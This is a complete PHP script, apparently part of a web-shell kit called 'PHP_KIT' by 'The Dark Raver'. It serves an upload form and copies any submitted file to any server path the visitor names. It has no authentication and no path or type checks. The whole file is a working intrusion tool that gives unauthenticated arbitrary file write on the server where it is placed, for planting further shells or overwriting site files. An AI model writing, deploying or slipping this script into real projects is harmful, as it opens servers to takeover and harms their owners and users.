<?
//
// PHP_KIT
//
// up.php = File Upload
//
// by: The Dark Raver
// modified: 21/01/2004
//
?>

<html><body>

<form enctype="multipart/form-data" action="" method="post">
<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
<p>Local File: <input name="userfile" type="file">
<p>Remote File: <input name="remotefile" type="text">
<input type="submit" value="Send">
</form><br><br><br>

<?

if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {
   copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);
   echo "Uploaded file: " . $HTTP_POST_FILES['userfile']['name'];
} else {
   echo "No File Uploaded";
}

?>

</html></body>

